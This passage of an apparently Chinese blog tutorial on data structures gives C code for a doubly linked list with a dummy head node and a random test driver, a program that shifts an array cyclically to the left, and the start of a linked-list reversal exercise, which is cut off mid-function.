class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">prev</span>;</span><br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">List</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// Node *head; 改为 dummy node, 而不再是一个指针</span><br>    Node head;<br>    <span class="hljs-keyword">int</span> len;<br>&#125; List;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    n-&gt;prev = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n) <span class="hljs-built_in">free</span>(n);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">List *<span class="hljs-title">initList</span><span class="hljs-params">()</span> </span>&#123;<br>    List *l = (List *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(List));<br>    l-&gt;head.next = <span class="hljs-literal">NULL</span>;<br>    l-&gt;head.prev = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// not necessarily</span><br>    l-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    Node *del_ = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        del_ = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(del_);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(l);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertNode</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt; l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    n-&gt;next = prev-&gt;next;<br>    prev-&gt;next = n;<br><br>    n-&gt;prev = prev;<br>    <span class="hljs-keyword">if</span> (n-&gt;next)<br>        n-&gt;next-&gt;prev = n;<br><br>    l-&gt;len++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入值</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertValue</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = initNode(val);<br>    <span class="hljs-keyword">if</span> (!insertNode(l, idx, n)) &#123;<br>        freeNode(n);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 删除</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">erase</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt;= l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    Node *tmp = prev-&gt;next;<br>    prev-&gt;next = tmp-&gt;next;<br><br>    <span class="hljs-keyword">if</span> (tmp-&gt;next)<br>        tmp-&gt;next-&gt;prev = prev;<br><br>    freeNode(tmp);<br>    l-&gt;len--;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">reverse</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l || l-&gt;len == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    Node *p = l-&gt;head.next;<br>    Node *cur = <span class="hljs-literal">NULL</span>;<br><br>    l-&gt;head.next = <span class="hljs-literal">NULL</span>;<br>    l-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        cur = p;<br>        p = p-&gt;next;<br>        insertNode(l, <span class="hljs-number">0</span>, cur);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    Node *tmp = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">int</span> len = l-&gt;len;<br><br>    <span class="hljs-comment">// printf("List+: [");</span><br>    <span class="hljs-comment">// while (len--) &#123;</span><br>    <span class="hljs-comment">//     tmp = p;</span><br>    <span class="hljs-comment">//     printf("%d-&gt;", p-&gt;val);</span><br>    <span class="hljs-comment">//     p = p-&gt;next;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// printf("NULL]\n");</span><br><br>    <span class="hljs-comment">// printf("List-: [");</span><br>    <span class="hljs-comment">// len = l-&gt;len;</span><br>    <span class="hljs-comment">// while (len--) &#123;</span><br>    <span class="hljs-comment">//     printf("%d-&gt;", tmp-&gt;val);</span><br>    <span class="hljs-comment">//     tmp = tmp-&gt;prev;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// printf("HEAD]\n");</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"List+: ["</span>);<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        tmp = p;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d-&gt;"</span>, p-&gt;val);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"NULL]\n"</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"List-: ["</span>);<br>    <span class="hljs-keyword">while</span> (tmp != &amp;(l-&gt;head)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d-&gt;"</span>, tmp-&gt;val);<br>        tmp = tmp-&gt;prev;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"HEAD]\n"</span>);<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>    srand(time(<span class="hljs-literal">NULL</span>));<br>    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">20</span>;<br>    List *l = initList();<br>    <span class="hljs-keyword">while</span> (cnt--) &#123;<br>        <span class="hljs-keyword">int</span> val = rand() % <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">int</span> opt = rand() % <span class="hljs-number">5</span>;<br>        <span class="hljs-keyword">int</span> idx = rand() % (l-&gt;len + <span class="hljs-number">3</span>) - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">switch</span> (opt) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"insert %d at %d, res = %s\n"</span>, val, idx,<br>                        insertValue(l, idx, val) ? <span class="hljs-string">"SUCCESS"</span> : <span class="hljs-string">"FAILED"</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"erease at %d, res = %s\n"</span>, idx,<br>                        erase(l, idx) ? <span class="hljs-string">"SUCCESS"</span> : <span class="hljs-string">"FAILED"</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"reverse, res = %s\n"</span>,<br>                        reverse(l) ? <span class="hljs-string">"SUCCESS"</span> : <span class="hljs-string">"FAILED"</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        showList(l);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="练习">练习</span></h3><p>LeetCode 剑指offer： 24 35 18 06 25 22 36 52</p><h4><span id="顺序表循环左移">顺序表循环左移</span></h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Vector</span> &#123;</span><br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>, len;<br>    <span class="hljs-keyword">int</span> *data;<br>&#125; Vec;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initVec</span><span class="hljs-params">(Vec *v, <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span>;<br>    v-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-built_in">size</span>;<br>    v-&gt;len = <span class="hljs-number">0</span>;<br>    v-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * <span class="hljs-built_in">size</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">expand</span><span class="hljs-params">(Vec *v)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> asize = v-&gt;<span class="hljs-built_in">size</span>;<br>    <span class="hljs-keyword">int</span> *tmp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (asize) &#123;<br>        tmp = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">realloc</span>(v-&gt;data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (asize + v-&gt;<span class="hljs-built_in">size</span>));<br>        <span class="hljs-keyword">if</span> (tmp) <span class="hljs-keyword">break</span>;<br>        asize &gt;&gt;= <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (tmp == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> ERROR;<br>    v-&gt;data = tmp;<br>    v-&gt;<span class="hljs-built_in">size</span> += asize;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Vec *v, <span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt; v-&gt;len) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">if</span> (v-&gt;<span class="hljs-built_in">size</span> == v-&gt;len) <br>        <span class="hljs-keyword">if</span> (!expand(v)) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-built_in">memcpy</span>(v-&gt;data + idx + <span class="hljs-number">1</span>, v-&gt;data + idx, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (v-&gt;len - idx));<br>    v-&gt;data[idx] = val;<br>    v-&gt;len++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeVec</span><span class="hljs-params">(Vec *v)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">free</span>(v-&gt;data);<br>    <span class="hljs-built_in">free</span>(v);<br>&#125;<br><br><span class="hljs-comment">// move</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">moveBlock</span><span class="hljs-params">(Vec *v, <span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">0</span> | num &gt; v-&gt;len) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">int</span> *tmp = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(num * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>    <span class="hljs-built_in">memcpy</span>(tmp, v-&gt;data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * num);<br>    <span class="hljs-built_in">memcpy</span>(v-&gt;data, v-&gt;data + num, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (v-&gt;len - num));<br>    <span class="hljs-built_in">memcpy</span>(v-&gt;data + (v-&gt;len - num), tmp, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printVec</span><span class="hljs-params">(Vec *v)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; v-&gt;len; i++) &#123;<br>        (i &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, *(v-&gt;data + i));<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Vec *v = (Vec *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Vec));<br>    (<span class="hljs-keyword">void</span>)initVec(v, <span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">int</span> n, k, val;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d%d"</span>, &amp;n, &amp;k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;val);<br>        <span class="hljs-keyword">if</span> (!insert(v, i, val)) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!moveBlock(v, k)) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br>    (<span class="hljs-keyword">void</span>)printVec(v);<br>    (<span class="hljs-keyword">void</span>)freeVec(v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4><span id="reverse-chars">reverse chars</span></h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">List</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// Node *head; 改为 dummy node, 而不再是一个指针</span><br>    Node head;<br>    <span class="hljs-keyword">int</span> len;<br>&#125; List;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n) <span class="hljs-built_in">free</span>(n);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">List *<span class="hljs-title">initList</span><span class="hljs-params">()</span> </span>&#123;<br>    List *l = (List *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(List));<br>    l-&gt;head.next = <span class="hljs-literal">NULL</span>;<br>    l-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    Node *del_ = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        del_ = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(del_);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(l);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertNode</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt; l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    n-&gt;next = prev-&gt;next;<br>    prev-&gt;next = n;<br><br>    l-&gt;len++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入值</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertValue</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = initNode(val);<br>    <span class="hljs-keyword">if</span> (!insertNode(l, idx, n)) &#123;<br>        freeNode(n);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 实现reverse</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">reverse</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    Node *cur = l-&gt;head.next;<br>    Node *tmp = <span class="hljs-literal">NULL</span>;<br>    l-&gt;head.next 